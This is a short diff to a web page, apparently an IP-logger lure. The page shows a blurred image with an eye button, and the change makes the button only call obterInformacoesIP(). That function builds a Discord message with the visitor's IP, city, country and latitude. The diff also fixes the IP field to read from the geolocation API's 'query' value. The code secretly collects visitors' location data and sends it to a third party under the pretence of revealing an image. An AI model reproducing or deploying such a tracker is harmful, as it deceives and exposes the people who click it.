@@ -70,8 +70,7 @@
     <!-- Imagem com desfoque -->
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsSeAYMJfIm1-qGvHep2V2fEpzhX3_GeD-4Usl6BhlLg&s" alt="Imagem embaçada" class="image">
     <!-- Botão de olho (ícone) -->
-    <button class="btn" onclick="toggleBlur();obterInformacoesIP();">
-  <i class="fas fa-eye"></i>
+    <button class="btn" onclick="obterInformacoesIP()"> <i class="fas fa-eye"></i>
 </button>
       </button>
     </a>
@@ -99,7 +98,7 @@ function obterInformacoesIP() {
       // Monta a mensagem que será enviada ao Discord
       const mensagem = {
         content: `Aqui estão as informações do IP:\n
-                  **IP:** ${data.ip}\n
+                  **IP:** ${data.query}\n
                   **Cidade:** ${data.city}\n
                   **País:** ${data.country}\n
                   **Latitude:** ${data.lat}\n
